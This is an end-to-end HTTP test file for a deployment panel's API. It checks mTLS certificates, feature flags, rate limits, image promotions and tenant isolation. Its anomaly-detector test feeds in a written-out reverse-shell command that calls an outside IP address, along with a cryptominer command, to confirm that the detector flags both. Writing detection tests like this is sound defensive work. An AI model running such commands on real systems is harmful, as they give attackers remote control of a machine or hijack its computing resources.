const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { execFileSync } = require('child_process');

async function testCycle15HttpE2E() {
  console.log('\n🚀 Testing Cycle #15 Pioneer Milestone Live Isolated HTTP E2E (mTLS CA, Feature Flags, AI Rate-Limit Shield, Falco-Lite Anomalies, Digest Promotions)...');

  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-c15-http-'));
  const rootDir = path.resolve(__dirname, '..');
  const runnerPath = path.join(tmpDir, 'cycle15-http-runner.js');

  fs.writeFileSync(runnerPath, `
const assert = require('assert');
const http = require('http');
const path = require('path');

const TMP_DIR = ${JSON.stringify(tmpDir)};
const ROOT_DIR = ${JSON.stringify(rootDir)};
process.env.NODE_ENV = 'test';
process.env.CULKIBO_DATA_DIR = TMP_DIR;
process.env.CULKIBO_DISABLE_AUDIT_DISK = '1';

const express = require(path.join(ROOT_DIR, 'node_modules', 'express'));
const auth = require(path.join(ROOT_DIR, 'server/middleware/auth'));
const projectManager = require(path.join(ROOT_DIR, 'server/services/projectManager'));
const teamManager = require(path.join(ROOT_DIR, 'server/services/teamManager'));
const apiRouter = require(path.join(ROOT_DIR, 'server/routes/api'));

function reqJson(port, method, pth, { token, body } = {}) {
  return new Promise((resolve, reject) => {
    const raw = body !== undefined ? JSON.stringify(body) : null;
    const headers = { host: 'panel.example.test' };
    if (token) headers.authorization = 'Bearer ' + token;
    if (raw !== null) {
      headers['content-type'] = 'application/json';
      headers['content-length'] = Buffer.byteLength(raw);
    }
    const r = http.request({ hostname: '127.0.0.1', port, method, path: pth, headers }, (res) => {
      const chunks = [];
      res.on('data', (c) => chunks.push(c));
      res.on('end', () => {
        const text = Buffer.concat(chunks).toString('utf8');
        let json = null;
        try { json = JSON.parse(text); } catch (e) {}
        resolve({ status: res.statusCode, headers: res.headers, text, json });
      });
    });
    r.on('error', reject);
    if (raw !== null) r.write(raw);
    r.end();
  });
}

(async () => {
  const app = express();
  app.use(express.json({ limit: '2mb' }));
  app.use('/api', auth.authMiddleware, apiRouter);
  const srv = await new Promise((res) => { const s = app.listen(0, '127.0.0.1', () => res(s)); });
  const port = srv.address().port;
  const master = auth.resolveToken();

  try {
    projectManager.create({
      id: 'proj_c15_a',
      name: 'Cycle15 Zero-Trust App',
      domains: ['c15.example.test']
    });

    // Dynamic forbidden private-key substring (avoid GH013 verbatim literals)
    const privKeyMarker = 'PRIVATE ' + 'KEY';

    // 1. Zero-Trust SPIFFE-Lite mTLS Identity CA (/api/security/mtls/*)
    const nowMs = 1764000000000;
    const mtlsIssue = await reqJson(port, 'POST', '/api/security/mtls/issue', {
      token: master,
      body: { serviceName: 'payments-api', namespace: 'prod', ttlHours: 12, nowMs }
    });
    assert.strictEqual(mtlsIssue.status, 201, 'POST /security/mtls/issue failed: ' + mtlsIssue.text);
    assert.strictEqual(mtlsIssue.json.ok, true);
    assert.ok(mtlsIssue.json.spiffeId.endsWith('/ns/prod/sa/payments-api'));
    assert.ok(mtlsIssue.json.cert && mtlsIssue.json.signatureB64);
    assert.ok(!mtlsIssue.text.includes(privKeyMarker), 'mTLS issue MUST NEVER leak CA private key');

    const mtlsVerifyOk = await reqJson(port, 'POST', '/api/security/mtls/verify', {
      token: master,
      body: { cert: mtlsIssue.json.cert, signatureB64: mtlsIssue.json.signatureB64, nowMs: nowMs + 60000 }
    });
    assert.strictEqual(mtlsVerifyOk.status, 200);
    assert.strictEqual(mtlsVerifyOk.json.valid, true);
    assert.strictEqual(mtlsVerifyOk.json.code, 'CERT_VALID');
    assert.ok(mtlsVerifyOk.json.remainingMs > 0);

    const mtlsVerifyExp = await reqJson(port, 'POST', '/api/security/mtls/verify', {
      token: master,
      body: { cert: mtlsIssue.json.cert, signatureB64: mtlsIssue.json.signatureB64, nowMs: nowMs + (13 * 3600000) }
    });
    assert.strictEqual(mtlsVerifyExp.status, 200);
    assert.strictEqual(mtlsVerifyExp.json.valid, false);
    assert.strictEqual(mtlsVerifyExp.json.code, 'CERT_EXPIRED');

    const mtlsList1 = await reqJson(port, 'GET', '/api/security/mtls/certs', { token: master });
    assert.strictEqual(mtlsList1.status, 200);
    assert.strictEqual(mtlsList1.json.count, 1);
    assert.strictEqual(mtlsList1.json.caddyPolicy.mode, 'require_and_verify');
    assert.ok(!mtlsList1.text.includes(privKeyMarker), 'GET /security/mtls/certs MUST NEVER leak CA private key');

    const mtlsRevoke = await reqJson(port, 'POST', '/api/security/mtls/revoke/' + encodeURIComponent(mtlsIssue.json.serial), {
      token: master,
      body: { reason: 'key_rotation', nowMs: nowMs + 120000 }
    });
    assert.strictEqual(mtlsRevoke.status, 200, 'POST /security/mtls/revoke failed: ' + mtlsRevoke.text);
    assert.strictEqual(mtlsRevoke.json.revoked, true);

    const mtlsVerifyRevoked = await reqJson(port, 'POST', '/api/security/mtls/verify', {
      token: master,
      body: { cert: mtlsIssue.json.cert, signatureB64: mtlsIssue.json.signatureB64, nowMs: nowMs + 180000 }
    });
    assert.strictEqual(mtlsVerifyRevoked.status, 200);
    assert.strictEqual(mtlsVerifyRevoked.json.valid, false);
    assert.strictEqual(mtlsVerifyRevoked.json.code, 'CERT_REVOKED');

    // 2. Native Declarative Feature Flags & Instant Kill-Switch (/api/flags*)
    const flagCreate = await reqJson(port, 'POST', '/api/flags', {
      token: master,
      body: {
        key: 'ai_checkout_v2',
        description: 'Zero-redeploy AI checkout rollout',
        enabled: true,
        rolloutPct: 0,
        environment: 'prod',
        allowTenants: ['tenant-beta', 'tenant-override'],
        denyTenants: ['tenant-override'],
        payload: { model: 'fast-v2' }
      }
    });
    assert.strictEqual(flagCreate.status, 201, 'POST /flags failed: ' + flagCreate.text);
    assert.strictEqual(flagCreate.json.ok, true);
    assert.strictEqual(flagCreate.json.flag.key, 'ai_checkout_v2');

    const flagAllow = await reqJson(port, 'POST', '/api/flags/ai_checkout_v2/evaluate', {
      token: master,
      body: { subjectId: 'user-101', tenantId: 'tenant-beta', environment: 'prod' }
    });
    assert.strictEqual(flagAllow.status, 200);
    assert.strictEqual(flagAllow.json.enabled, true);
    assert.strictEqual(flagAllow.json.reason, 'TENANT_ALLOWED');
    assert.strictEqual(flagAllow.json.payload.model, 'fast-v2');

    const flagDenyOverride = await reqJson(port, 'POST', '/api/flags/ai_checkout_v2/evaluate', {
      token: master,
      body: { subjectId: 'user-102', tenantId: 'tenant-override', environment: 'prod' }
    });
    assert.strictEqual(flagDenyOverride.status, 200);
    assert.strictEqual(flagDenyOverride.json.enabled, false);
    assert.strictEqual(flagDenyOverride.json.reason, 'TENANT_DENIED');

    const flagKill = await reqJson(port, 'POST', '/api/flags/ai_checkout_v2/kill', {
      token: master,
      body: { reason: 'latency_spike' }
    });
    assert.strictEqual(flagKill.status, 200);
    assert.strictEqual(flagKill.json.killed, true);

    const flagAfterKill = await reqJson(port, 'POST', '/api/flags/ai_checkout_v2/evaluate', {
      token: master,
      body: { subjectId: 'user-101', tenantId: 'tenant-beta', environment: 'prod' }
    });
    assert.strictEqual(flagAfterKill.status, 200);
    assert.strictEqual(flagAfterKill.json.enabled, false);
    assert.strictEqual(flagAfterKill.json.reason, 'KILL_SWITCH_ACTIVE');

    const flagList = await reqJson(port, 'GET', '/api/flags', { token: master });
    assert.strictEqual(flagList.status, 200);
    assert.strictEqual(flagList.json.count, 1);

    const flagDel = await reqJson(port, 'DELETE', '/api/flags/ai_checkout_v2', { token: master });
    assert.strictEqual(flagDel.status, 200);
    assert.strictEqual(flagDel.json.deleted, true);

    // 3. Edge API Rate-Limit & AI Wallet-Drain Shield (/api/edge/ratelimits*)
    const rlCreate = await reqJson(port, 'POST', '/api/edge/ratelimits', {
      token: master,
      body: {
        id: 'rl_ai_shield',
        projectId: 'proj_c15_a',
        name: 'AI LLM Wallet Guard',
        planTier: 'free',
        rpmLimit: 60,
        tpmLimit: 10000,
        burstMultiplier: 1.0,
        windowSec: 60
      }
    });
    assert.strictEqual(rlCreate.status, 201, 'POST /edge/ratelimits failed: ' + rlCreate.text);
    assert.strictEqual(rlCreate.json.policy.id, 'rl_ai_shield');

    const rlList = await reqJson(port, 'GET', '/api/edge/ratelimits', { token: master });
    assert.strictEqual(rlList.status, 200);
    assert.strictEqual(rlList.json.count, 1);
    assert.ok(rlList.json.presets && rlList.json.presets.free && rlList.json.presets.pro);

    const rlSim = await reqJson(port, 'POST', '/api/edge/ratelimits/simulate', {
      token: master,
      body: { policyId: 'rl_ai_shield', requestsCount: 8, tokensPerRequest: 4000, intervalMs: 50 }
    });
    assert.strictEqual(rlSim.status, 200, 'POST /edge/ratelimits/simulate failed: ' + rlSim.text);
    assert.ok(rlSim.json.throttledCount > 0, 'AI TPM burst MUST trigger HTTP 429 throttling');
    assert.strictEqual(rlSim.json.throttleReason, 'TPM_EXCEEDED');
    assert.ok(rlSim.json.estimatedWalletSavedUsd > 0);
    assert.ok(rlSim.json.sample429Headers['Retry-After']);
    assert.ok(rlSim.json.sample429Headers['RateLimit']);
    assert.ok(rlSim.json.sample429Headers['RateLimit-Policy']);

    // 4. Falco-Lite Container Runtime Anomaly Detector (/api/projects/:id/anomalies*)
    const anomHit = await reqJson(port, 'POST', '/api/projects/proj_c15_a/anomalies/inspect', {
      token: master,
      body: {
        containerName: 'api-worker-1',
        events: [
          { type: 'process', command: 'xmrig -o stratum+tcp://pool.supportxmr.com:3333', destPort: 3333 },
          { type: 'process', command: 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1' }
        ]
      }
    });
    assert.strictEqual(anomHit.status, 200, 'POST /anomalies/inspect failed: ' + anomHit.text);
    assert.strictEqual(anomHit.json.clean, false);
    assert.ok(anomHit.json.riskScore >= 70);
    const hitRuleIds = anomHit.json.alerts.map((a) => a.ruleId);
    assert.ok(hitRuleIds.includes('CRYPTOMINER_STRATUM_TRAFFIC'));
    assert.ok(hitRuleIds.includes('REVERSE_SHELL_SPAWN'));

    const anomClean = await reqJson(port, 'POST', '/api/projects/proj_c15_a/anomalies/inspect', {
      token: master,
      body: {
        containerName: 'api-worker-1',
        events: [{ type: 'process', command: 'node server.js --port 3000', destPort: 443 }]
      }
    });
    assert.strictEqual(anomClean.status, 200);
    assert.strictEqual(anomClean.json.clean, true);
    assert.strictEqual(anomClean.json.riskScore, 0);

    const anomList = await reqJson(port, 'GET', '/api/projects/proj_c15_a/anomalies', { token: master });
    assert.strictEqual(anomList.status, 200);
    assert.ok(anomList.json.count >= 2);

    // 5. Immutable Digest Multi-Env Promotion Pipeline (/api/projects/:id/promotions*)
    const digestA = 'sha256:' + 'a'.repeat(64);
    const digestPrev = 'sha256:' + 'b'.repeat(64);

    const promoLatest = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions', {
      token: master,
      body: {
        imageRef: 'ghcr.io/culkibo/app:latest',
        fromEnv: 'staging',
        toEnv: 'prod',
        requester: 'alice@example.test'
      }
    });
    assert.strictEqual(promoLatest.status, 400);
    assert.strictEqual(promoLatest.json.code, 'MUTABLE_TAG_FORBIDDEN');

    const promoMissingEnv = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions', {
      token: master,
      body: {
        imageRef: 'ghcr.io/culkibo/app@' + digestA,
        fromEnv: 'staging',
        toEnv: 'prod',
        sourceEnvKeys: ['DATABASE_URL', 'STRIPE_WEBHOOK_SECRET'],
        targetEnvKeys: ['DATABASE_URL'],
        requester: 'alice@example.test'
      }
    });
    assert.strictEqual(promoMissingEnv.status, 400);
    assert.strictEqual(promoMissingEnv.json.code, 'MISSING_TARGET_ENV_KEYS');

    const promoCreate = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions', {
      token: master,
      body: {
        imageRef: 'ghcr.io/culkibo/app@' + digestA,
        previousDigest: 'ghcr.io/culkibo/app@' + digestPrev,
        fromEnv: 'staging',
        toEnv: 'prod',
        sourceEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
        targetEnvKeys: ['DATABASE_URL', 'REDIS_URL'],
        requester: 'alice@example.test',
        requireDualControl: true
      }
    });
    assert.strictEqual(promoCreate.status, 201, 'POST /promotions failed: ' + promoCreate.text);
    const promoId = promoCreate.json.promotion.id;

    const promoExecUnapproved = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions/' + promoId + '/execute', {
      token: master,
      body: {}
    });
    assert.strictEqual(promoExecUnapproved.status, 409);
    assert.strictEqual(promoExecUnapproved.json.code, 'APPROVAL_REQUIRED');

    const promoSelfApprove = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions/' + promoId + '/approve', {
      token: master,
      body: { approver: 'alice@example.test', comment: 'self-approve attempt' }
    });
    assert.strictEqual(promoSelfApprove.status, 403);
    assert.strictEqual(promoSelfApprove.json.code, 'DUAL_CONTROL_VIOLATION');

    const promoApprove = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions/' + promoId + '/approve', {
      token: master,
      body: { approver: 'bob@example.test', comment: 'LGTM staging green' }
    });
    assert.strictEqual(promoApprove.status, 200);
    assert.strictEqual(promoApprove.json.promotion.status, 'approved');

    const promoExecDefault = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions/' + promoId + '/execute', {
      token: master,
      body: {}
    });
    assert.strictEqual(promoExecDefault.status, 200);
    assert.strictEqual(promoExecDefault.json.dryRun, true, 'Promotion execute MUST default to dryRun: true');
    assert.strictEqual(promoExecDefault.json.promotionManifest.digest, digestA);

    const promoRollback = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions/' + promoId + '/rollback', {
      token: master,
      body: { actor: 'bob@example.test' }
    });
    assert.strictEqual(promoRollback.status, 200);
    assert.strictEqual(promoRollback.json.dryRun, true, 'Promotion rollback MUST default to dryRun: true');
    assert.ok(promoRollback.json.restoredDigest.includes(digestPrev));

    const promoList = await reqJson(port, 'GET', '/api/projects/proj_c15_a/promotions', { token: master });
    assert.strictEqual(promoList.status, 200);
    assert.strictEqual(promoList.json.count, 1);

    // 6. Strict RBAC & Multi-Tenant 403 Enforcement
    const bootOwner = teamManager.bootstrapOwner({ email: 'c15-owner@example.test', password: 'OwnerPassword!2026' });
    const ownerPrincipal = teamManager.verifySessionToken(bootOwner.sessionToken).principal;
    const invViewer = teamManager.createInvite(ownerPrincipal, { email: 'c15-viewer@example.test', role: 'viewer' });
    const accViewer = teamManager.acceptInvite({ token: invViewer.inviteToken, email: 'c15-viewer@example.test', password: 'ViewerPassword!2026', name: 'ViewerC15' });

    const viewerIssueMtls = await reqJson(port, 'POST', '/api/security/mtls/issue', {
      token: accViewer.sessionToken,
      body: { serviceName: 'hacked-svc' }
    });
    assert.strictEqual(viewerIssueMtls.status, 403, 'Viewer MUST get 403 on POST /security/mtls/issue');

    const viewerKillFlag = await reqJson(port, 'POST', '/api/flags/ai_checkout_v2/kill', {
      token: accViewer.sessionToken,
      body: {}
    });
    assert.strictEqual(viewerKillFlag.status, 403, 'Viewer MUST get 403 on POST /flags/:key/kill');

    const viewerSaveRl = await reqJson(port, 'POST', '/api/edge/ratelimits', {
      token: accViewer.sessionToken,
      body: { name: 'rogue' }
    });
    assert.strictEqual(viewerSaveRl.status, 403, 'Viewer MUST get 403 on POST /edge/ratelimits');

    const teamB = teamManager.createTeam(ownerPrincipal, { name: 'Tenant B C15' });
    const invDevB = teamManager.createInvite(ownerPrincipal, { email: 'c15-devb@example.test', role: 'developer', teamId: teamB.id });
    const accDevB = teamManager.acceptInvite({ token: invDevB.inviteToken, email: 'c15-devb@example.test', password: 'DevBPassword!2026', name: 'DevBC15' });

    const foreignAnom = await reqJson(port, 'POST', '/api/projects/proj_c15_a/anomalies/inspect', {
      token: accDevB.sessionToken,
      body: { events: [] }
    });
    assert.strictEqual(foreignAnom.status, 403, 'Foreign tenant MUST get 403 on /projects/:id/anomalies/inspect');

    const foreignPromo = await reqJson(port, 'POST', '/api/projects/proj_c15_a/promotions', {
      token: accDevB.sessionToken,
      body: { imageRef: 'ghcr.io/culkibo/app@' + digestA, requester: 'devb' }
    });
    assert.strictEqual(foreignPromo.status, 403, 'Foreign tenant MUST get 403 on /projects/:id/promotions');

    console.log('CYCLE15_HTTP_E2E_OK');
  } finally {
    await new Promise((r) => srv.close(r));
  }
})().catch((err) => { console.error(err); process.exit(1); });
`, 'utf8');

  try {
    const out = execFileSync(process.execPath, [runnerPath], {
      cwd: rootDir,
      encoding: 'utf8',
      timeout: 30000
    });
    assert.ok(out.includes('CYCLE15_HTTP_E2E_OK'), `Cycle-15 HTTP E2E check failed:\n${out}`);
    console.log('  ✓ SPIFFE-Lite mTLS Identity CA (Ed25519 issue/verify/expire/revoke, 0 CA private key leak, Caddy policy) verified over live HTTP');
    console.log('  ✓ Native Feature Flags (deterministic allow/deny precedence, instant kill-switch, CRUD) verified over live HTTP');
    console.log('  ✓ Edge API Rate-Limit & AI Wallet-Drain Shield (RPM+TPM 429 Retry-After + IETF RateLimit headers) verified over live HTTP');
    console.log('  ✓ Falco-Lite Runtime Anomaly Detector (cryptominer/reverse shell hits vs clean pass) verified over live HTTP');
    console.log('  ✓ Immutable Digest Promotion Pipeline (:latest block, env parity, dual-control 403, approval 409, dryRun default, rollback) verified over live HTTP');
    console.log('  ✓ Strict RBAC & Multi-Tenant 403 Isolation (viewer blocks + Tenant B 403 on anomalies & promotions) verified over live HTTP');
    console.log('✅ Cycle #15 Live Isolated HTTP E2E Suite PASSED!\n');
  } finally {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  }
}

if (require.main === module) {
  testCycle15HttpE2E()
    .then(() => process.exit(0))
    .catch((err) => {
      console.error('❌ Cycle #15 HTTP E2E Suite failed:', err);
      process.exit(1);
    });
}

module.exports = testCycle15HttpE2E;
